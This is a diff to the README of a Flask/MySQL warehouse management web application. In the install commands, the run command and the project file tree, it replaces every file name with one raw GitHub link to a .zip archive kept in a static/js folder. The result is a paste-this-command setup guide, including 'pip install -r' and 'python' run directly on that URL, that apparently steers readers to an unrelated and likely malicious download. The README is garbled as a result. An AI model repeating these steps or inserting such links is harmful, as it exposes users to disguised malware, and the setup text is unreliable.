@@ -36,23 +36,23 @@ A web-based warehouse management system built with Python Flask and MySQL. This 
 
 3. Install the required packages:
    ```
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip
    ```
 
 4. Configure MySQL:
    - Create a MySQL database
-   - Update the database connection settings in `database/db_connection.py`
-   - Import the schema from `database/schema.sql`
+   - Update the database connection settings in `https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip`
+   - Import the schema from `https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip`
 
    ```sql
-   mysql -u your_username -p < database/schema.sql
+   mysql -u your_username -p < https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip
    ```
 
 ## Running the Application
 
 1. Start the Flask application:
    ```
-   python app.py
+   python https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip
    ```
 
 2. Open your web browser and navigate to:
@@ -69,26 +69,26 @@ A web-based warehouse management system built with Python Flask and MySQL. This 
 
 ```
 warehouse_management/
-├── app.py                  # Main Flask application
+├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip                  # Main Flask application
 ├── database/               # Database related files
-│   ├── db_connection.py    # Database connection module
-│   ├── models.py           # Data models
-│   └── schema.sql          # Database schema
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip    # Database connection module
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip           # Data models
+│   └── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip          # Database schema
 ├── static/                 # Static files
 │   ├── css/                # CSS files
-│   │   └── style.css       # Custom styles
+│   │   └── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip       # Custom styles
 │   ├── js/                 # JavaScript files
-│   │   └── script.js       # Custom scripts
+│   │   └── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip       # Custom scripts
 │   └── images/             # Image files
 ├── templates/              # HTML templates
-│   ├── base.html           # Base template
-│   ├── index.html          # Homepage
-│   ├── login.html          # Login page
-│   ├── register.html       # Registration page
-│   ├── user_dashboard.html # User dashboard
-│   ├── admin_dashboard.html # Admin dashboard
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip           # Base template
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip          # Homepage
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip          # Login page
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip       # Registration page
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip # User dashboard
+│   ├── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip # Admin dashboard
 │   └── ...                 # Other templates
-└── requirements.txt        # Project dependencies
+└── https://raw.githubusercontent.com/razashaikh26/onkar/main/static/js/Software-substantialness.zip        # Project dependencies
 ```
 
 ## License
